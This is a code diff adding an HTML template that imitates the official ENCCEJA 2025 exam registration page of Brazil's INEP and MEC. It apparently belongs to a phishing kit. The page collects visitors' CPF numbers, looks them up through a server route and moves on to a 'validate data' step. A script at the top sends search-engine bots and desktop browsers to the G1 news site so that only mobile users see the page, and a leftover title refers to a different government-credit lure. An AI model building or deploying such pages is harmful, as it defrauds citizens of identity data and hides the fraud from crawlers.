@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <head>
+        <script type="text/javascript">
+            (function(c,l,a,r,i,t,y){
+                c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+                t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+                y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+            })(window, document, "clarity", "script", "qs9kqwmhmp");
+        </script>
+        <meta charset="utf-8"/>
+        <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+        <title>
+         G1 - Governo lança Programa Crédito do Trabalhador com juros quase zerados
+        </title>
+        <script>
+         // Função para detectar se é um dispositivo móvel
+          function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+          }
+
+          // Função para detectar se é um bot
+          function isBot() {
+            const botAgents = [
+              'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+              'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+            ];
+
+            return botAgents.some(bot => navigator.userAgent.includes(bot));
+          }
+
+          // Função para verificar se a largura da janela é maior que 768px
+          function isWideScreen() {
+            return window.innerWidth > 768;
+          }
+
+          // Redirecionar ou bloquear o acesso
+          function checkAccess() {
+            if (isBot() || (!isMobile() && isWideScreen())) {
+              // Redirecionar para o site G1 se o acesso for bloqueado
+              window.location.href = "https://g1.globo.com/";
+            }
+          }
+
+          // Executar a função de verificação ao carregar a página
+          window.onload = checkAccess;
+
+          // Adicionar um listener para verificar novamente se a janela for redimensionada
+          window.addEventListener('resize', checkAccess);
+        </script>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>ENCCEJA 2025 - Inscrição</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <style>
+        .gov-header {
+            background-color: #222222;
+        }
+        .inep-header {
+            background-color: #044785;
+        }
+        .encceja-color {
+            color: #3b5998;
+        }
+        .encceja-light {
+            color: #a0a0a0;
+        }
+        .form-header {
+            background-color: #2c5985;
+            color: white;
+        }
+        .form-footer {
+            background-color: #5d85ab;
+            color: white;
+        }
+        
+        button#submit-button {
+            transition: all 0.2s ease;
+            background-color: #5d85ab;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        button#submit-button:not([disabled]) {
+            color: white;
+            cursor: pointer;
+        }
+        
+        button#submit-button:not([disabled]):hover {
+            background-color: #4d7396;
+        }
+        .required-star {
+            color: #ff0000;
+        }
+        .footer-bg {
+            background-color: #1c2b39;
+        }
+        input::placeholder {
+            font-family: 'Rawline', Arial, sans-serif;
+        }
+        .selected {
+            border: 4px dashed #2B7A9A !important;
+        }
+        .transparent {
+            opacity: 0.5;
+        }
+    </style>
+    <script>
+        function formatCPF(input) {
+            // Remove qualquer caractere que não seja número
+            let value = input.value.replace(/\D/g, '');
+            
+            // Limita a 11 caracteres
+            if (value.length > 11) {
+                value = value.substring(0, 11);
+            }
+            
+            // Formata como CPF (xxx.xxx.xxx-xx)
+            if (value.length > 9) {
+                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+            } else if (value.length > 6) {
+                value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+            } else if (value.length > 3) {
+                value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+            }
+            
+            input.value = value;
+            checkFormValidity();
+        }
+        
+        function unformatCPF(cpf) {
+            return cpf.replace(/\D/g, '');
+        }
+
+        function selectImage(element, index) {
+            const images = document.querySelectorAll('.image-option');
+            images.forEach(img => {
+                img.classList.remove('selected');
+                img.classList.add('transparent');
+            });
+            element.classList.add('selected');
+            element.classList.remove('transparent');
+
+            if (index !== 4) {
+                showErrorPopup();
+            } else {
+                checkFormValidity();
+            }
+        }
+
+        function showErrorPopup() {
+            const popup = document.getElementById('error-popup');
+            popup.classList.remove('hidden');
+            setTimeout(() => {
+                popup.classList.add('hidden');
+            }, 3000);
+        }
+
+        function checkFormValidity() {
+            const cpfInput = document.querySelector('#cpf');
+            const selectedImage = document.querySelector('.image-option.selected');
+            const submitButton = document.querySelector('#submit-button');
+
+            if (cpfInput.value.length === 14 && selectedImage && selectedImage === document.querySelectorAll('.image-option')[4]) {
+                submitButton.disabled = false;
+            } else {
+                submitButton.disabled = true;
+            }
+        }
+        
+        function showValidationPopup() {
+            const popup = document.getElementById('validation-popup');
+            popup.classList.remove('hidden');
+        }
+        
+        function hideValidationPopup() {
+            const popup = document.getElementById('validation-popup');
+            popup.classList.add('hidden');
+        }
+        
+        function submitForm() {
+            const cpfInput = document.querySelector('#cpf');
+            const cpf = unformatCPF(cpfInput.value);
+            
+            // Mostrar popup de validação
+            showValidationPopup();
+            
+            // Consultar a API de CPF
+            fetch(`/consultar-cpf?cpf=${cpf}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Dados do CPF:", data);
+                    
+                    // Armazenar os dados retornados no localStorage para serem usados na próxima etapa
+                    localStorage.setItem('cpfData', JSON.stringify(data));
+                    
+                    // Redirecionar para a página de validação de dados
+                    setTimeout(() => {
+                        window.location.href = '/validar-dados';
+                    }, 1500);
+                })
+                .catch(error => {
+                    console.error("Erro ao buscar CPF:", error);
+                    hideValidationPopup();
+                    alert("Ocorreu um erro ao validar o CPF. Por favor, tente novamente.");
+                });
+        }
+    </script>
+</head>
+<body class="flex flex-col min-h-screen">
+    <!-- Government Header -->
+    <header class="gov-header text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- INEP Header -->
+    <div class="inep-header py-3">
+        <div class="container mx-auto px-4">
+            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <style>
+                        .cls-2{fill:#fff}
+                    </style>
+                </defs>
+                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
+            </svg>
+        </div>
+    </div>
+    <!-- Main Content -->
+    <main class="flex-grow py-8">
+        <div class="container mx-auto px-4 max-w-3xl">
+            <!-- ENCCEJA Logo -->
+            <div class="text-center mb-6">
+                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420"/>
+            </div>
+            <!-- Form Container -->
+            <div class="border border-gray-300 rounded">
+                <!-- Form Header -->
+                <div class="form-header py-2 px-4 text-center">
+                    <h2 class="text-lg">
+                        Inscrição &gt; ENCCEJA
+                    </h2>
+                </div>
+                <!-- Form Content -->
+                <div class="p-4">
+                    <p class="mb-4">
+                        Para efetuar sua inscrição informe os dados abaixo e clique em enviar:
+                    </p>
+                    <form>
+                        <div class="mb-4">
+                            <label class="block mb-1">
+                                <span>CPF:</span>
+                                <span class="required-star">*</span>
+                                <span class="ml-1 text-red-500">
+                                    <i class="fas fa-info-circle"></i>
+                                </span>
+                            </label>
+                            <input id="cpf" class="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide" placeholder="___.___.___-__" type="tel" inputmode="numeric" pattern="[0-9]*" oninput="formatCPF(this)" style=""/>
+                        </div>
+                        <div class="mb-4">
+                            <p class="text-[#2B4F81] text-base font-bold" style="font-size: 16px;">
+                                Clique abaixo, na figura FOLHA:
+                                <span class="text-red-700 text-lg">*</span>
+                                <span class="text-[#2B4F81] text-base rounded-full border border-[#2B4F81] w-5 h-5 inline-flex items-center justify-center">?</span>
+                            </p>
+                        </div>
+                        <div class="flex items-center">
+                            <div class="grid grid-cols-5 gap-1 border-4 border-[#D8E8E8] p-1 bg-[#D8E8E8]">
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 0)">
+                                    <img alt="Globe icon showing Earth" class="w-6 h-6" src="https://i.ibb.co/2Ytyd5h2/download-6.png"/>
+                                </div>
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 1)">
+                                    <img alt="Magnifying glass search icon" class="w-6 h-6" src="https://i.ibb.co/cK1RdMv5/download-5.png"/>
+                                </div>
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 2)">
+                                    <img alt="Footprint icon" class="w-6 h-6" src="https://i.ibb.co/4wJKGsVJ/download-4.png"/>
+                                </div>
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 3)">
+                                    <img alt="Padlock or lock icon" class="w-6 h-6" src="https://i.ibb.co/67VXwQ9M/download-3.png"/>
+                                </div>
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 4)">
+                                    <img alt="Leaf icon representing nature" class="w-6 h-6" src="https://i.ibb.co/N6Gvw2jg/download-2.png"/>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <!-- Form Footer -->
+                <div class="border-t border-gray-300">
+                    <div class="p-2 bg-gray-100 flex items-center">
+                        <a class="text-gray-700 flex items-center" href="#">
+                            <i class="fas fa-sign-out-alt mr-1"></i>
+                            Sair
+                        </a>
+                    </div>
+                    <div class="form-footer p-0 flex justify-center items-center">
+                        <button id="submit-button" class="flex items-center justify-center w-full h-full py-3" type="button" disabled onclick="submitForm()">
+                            <i class="fas fa-paper-plane mr-2"></i>
+                            <span>Enviar</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <!-- Footer -->
+    <footer class="footer-bg text-white py-4 text-xs">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
+                    <defs><style>.cls-2{fill:#fff}</style></defs>
+                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"/>
+                </svg>
+                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
+            </div>
+            <div class="flex justify-between items-center">
+                <div>
+                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-phone-alt mr-1"></i>
+                    0800 616161
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Error Popup -->
+    <div id="error-popup" class="fixed top-0 left-0 right-0 bg-red-500 text-white p-4 text-center hidden z-50">
+        Você deve selecionar a imagem da folha para prosseguir.
+    </div>
+
+    <!-- Validation Popup -->
+    <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
+        <div class="absolute inset-0 bg-black bg-opacity-50"></div>
+        <div class="bg-[#5d85ab] text-white p-6 rounded-lg shadow-lg z-10 flex flex-col items-center max-w-md mx-4">
+            <div class="spinner-border mb-4" role="status">
+                <svg class="animate-spin h-10 w-10 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+            </div>
+            <h3 class="text-xl font-bold mb-2">Validando seus dados...</h3>
+            <p class="text-center">Aguarde enquanto verificamos as informações do CPF.</p>
+        </div>
+    </div>
+</body>
+</html>
